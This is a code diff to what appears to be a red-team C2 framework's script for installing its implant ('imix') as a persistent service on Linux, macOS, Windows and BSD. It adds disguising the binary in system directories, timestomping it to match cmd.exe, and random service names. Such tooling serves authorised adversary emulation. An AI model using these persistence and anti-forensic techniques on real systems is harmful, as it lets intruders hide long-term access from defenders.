@@ -153,9 +153,9 @@ name="{{ service_name }}"
 rcvar="{{ service_name }}_enable"
 
 # The command to start the service
-command="{{ service_start_cmd }}"
+command="/usr/sbin/daemon"
 # Additional command arguments if any
-command_args=""
+command_args="-f {{ service_start_cmd }}"
 
 # Load the rc.subr script
 load_rc_config $name
@@ -226,10 +226,15 @@ def is_using_sysvinit():
 def is_using_bsdinit():
     # Lol this is how ansible does it too :shrug:
     # https://github.com/ansible/ansible/blob/386edc666ec2a053b4d576fc4b2deeb46fe492b8/lib/ansible/module_utils/facts/system/service_mgr.py#L124
-    if sys.get_os()['platform'] == "BSD":
+    if sys.get_os()['platform'] == "PLATFORM_BSD":
         return True
     return False
 
+def get_systemd_dir():
+    for dir in ["/usr/lib/systemd/system/", "/lib/systemd/system/"]:
+        if file.is_dir(dir):
+            return dir
+    return False
 
 def systemd(service_name, service_desc, executable_path, executable_args):
     # assets.copy("persist_service/files/systemd.service.j2","/tmp/systemd.service.j2")
@@ -239,8 +244,11 @@ def systemd(service_name, service_desc, executable_path, executable_args):
         "SERVICE_DESC": service_desc,
         "SERVICE_START_CMD": executable_path+" "+executable_args
     }
-    file.template("/tmp/systemd.service.j2",
-                  "/usr/lib/systemd/system/"+service_name+".service", args, False)
+    systemd_dir = get_systemd_dir()
+    if systemd_dir == False:
+        eprint("No systemd dir found aborting")
+        return False
+    file.template("/tmp/systemd.service.j2", systemd_dir+service_name+".service", args, False)
     file.remove("/tmp/systemd.service.j2")
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
@@ -317,12 +325,22 @@ def launch_daemon(service_name, executable_path, executable_args):
     sys.shell("launchctl load -w /Library/LaunchDaemons/"+service_name+".plist")
     print("Launch daemon installed")
 
-
-def windows_service_manager(service_name, service_display_name, service_description, executable_path):
-    create_res = sys.shell("sc.exe create "+service_name+" binpath= "+executable_path +
-                           " displayname="+service_display_name+" start= auto type= own")
+def windows_service_manager(service_name, service_display_name, service_description, executable_path, executable_args):
+    if service_display_name == "":
+        service_display_name = service_name
+    binpath = executable_path
+    if executable_args != "":
+        binpath = executable_path + " " + executable_args
+    create_res = sys.shell("sc.exe create "+service_name+" binpath= \""+binpath+
+                           "\" displayname= \""+service_display_name+"\" start= auto type= own")
     if 'ERROR' in create_res['stdout'] or 'USAGE' in create_res['stdout'] or create_res['stderr'] != "":
         print("Failed to create service:\n"+str(create_res)+"\n")
+        print("\n")
+        return
+
+    desc_res = sys.shell("sc.exe description "+service_name+" \""+service_description+"\"")
+    if 'ERROR' in desc_res['stdout'] or 'USAGE' in create_res['stdout'] or desc_res['stderr'] != "":
+        print("Failed to set service description:\n"+desc_res+"\n")
         print("\n")
         return
 
@@ -333,10 +351,9 @@ def windows_service_manager(service_name, service_display_name, service_descript
         return
 
 
-def persist_service(service_name, service_desc, executable_name, executable_args):
+def persist_service(service_name, service_desc, executable_path, executable_args, windows_display_name):
     src_path = process.info()['exe']
     if sys.is_linux():
-        executable_path = "/bin/"+executable_name
         file.copy(src_path, executable_path)
         if is_using_systemd():
             systemd(service_name, service_desc,
@@ -345,16 +362,16 @@ def persist_service(service_name, service_desc, executable_name, executable_args
             sysvinit(service_name, service_desc,
                      executable_path, executable_args)
     elif sys.is_macos():
-        executable_path = "/var/root/"+executable_name
         file.copy(src_path, executable_path)
         launch_daemon(service_name, executable_path, executable_args)
     elif sys.is_windows():
-        executable_path = "C:\\ProgramData\\"+executable_name+".exe"
+        if not sys.write_reg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main", "DisableFirstRunCustomize", "REG_DWORD", 2):
+            print("failed to write IE first run regkey")
         file.copy(src_path, executable_path)
+        sys.shell(f"""powershell /c "\$src = Get-Item 'C:\\Windows\\System32\\cmd.exe'; \$tgt = Get-Item '{executable_path}'; $tgt.CreationTime = $src.CreationTime; $tgt.LastWriteTime = $src.LastWriteTime; $tgt.LastAccessTime = $src.LastAccessTime" """)
         windows_service_manager(
-            service_name, service_name, service_desc, executable_path)
-    elif sys.get_os()['platform'] == "BSD":
-        executable_path = "/bin/"+executable_name
+            service_name, windows_display_name, service_desc, executable_path, executable_args)
+    elif sys.get_os()['platform'] == "PLATFORM_BSD":
         file.copy(src_path, executable_path)
         if is_using_bsdinit():
             bsdinit(service_name, service_desc,
@@ -362,22 +379,58 @@ def persist_service(service_name, service_desc, executable_name, executable_args
     else:
         print("OS not supported")
 
+def is_installed(paths):
+    for p in process.list():
+        for path in paths:
+            if p['path'] == path:
+                return True
+    return False
+
+def get_executable_paths(name):
+    paths = []
+    if sys.is_linux():
+        # Systemd internal service
+        if name.startswith("systemd"):
+            systemd_dir = get_systemd_dir()
+            return [f"{systemd_dir}{name}"]
+        # Check /usr
+        if file.is_dir("/usr"):
+            return [f"/usr/bin/{name}", f"/usr/sbin/{name}"]
+        else:
+            return [f"/bin/{name}", f"/sbin/{name}"]
+        return subdir+name
+    elif sys.is_macos():
+        return[ "/var/root/"+name]
+    elif sys.is_windows():
+        return ["C:\\Windows\\System32\\"+name+".exe"] # ok
+    elif sys.get_os()['platform'] == "PLATFORM_BSD":
+        return ["/bin/"+name]
+    return False
+
 
 def parse_and_persist(config_data):
-    if len(config_data['service_configs']) < 1:
+    configs = config_data['service_configs']
+    if len(configs) < 1:
         print("Please add a service_config to your imix config")
     else:
-        conf = config_data['service_configs'][0]
+        for conf in configs:
+            paths = get_executable_paths(conf['executable_name'])
+            if is_installed(paths):
+                return
+        index = random.int(0, len(configs))
+        conf = configs[index]
+        paths = get_executable_paths(conf['executable_name'])
         persist_service(
             conf['name'],
             conf['description'],
-            conf['executable_name'],
-            "",
+            paths[random.int(0, len(paths))],
+            conf['executable_args'],
+            conf['windows_display_name'],
         )
 
 
 """
-This script uses the first provided services_configs to install a service
+This script randomly chooses a services_configs to install a service
 On the local system. The config file specified for the install will be used
 by the imix agent. The imix binary itself will be copied to the install
 location. The original imix binary will still exist so you may wish to delete
@@ -391,10 +444,25 @@ def main():
     config_data = {
         "service_configs": [
             {
-                "name": "imix",
-                "description": "Imix c2 agent",
-                "executable_name": "imix",
-                "executable_args": ""
+                "name": "imix_svc",
+                "windows_display_name": "",
+                "description": "Realm c2 agent service",
+                "executable_name": "imixd",
+                "executable_args": "--some-fake-args"
+            },
+            {
+                "name": "imix_svc2",
+                "windows_display_name": "Service display name on Windows",
+                "description": "Another realm c2 agent service",
+                "executable_name": "imixd2",
+                "executable_args": "-q -k -v"
+            },
+            {
+                "name": "imix_svc3",
+                "windows_display_name": "",
+                "description": "Another description.",
+                "executable_name": "imixd3",
+                "executable_args": "--no-check-certificates"
             }
         ]
     }
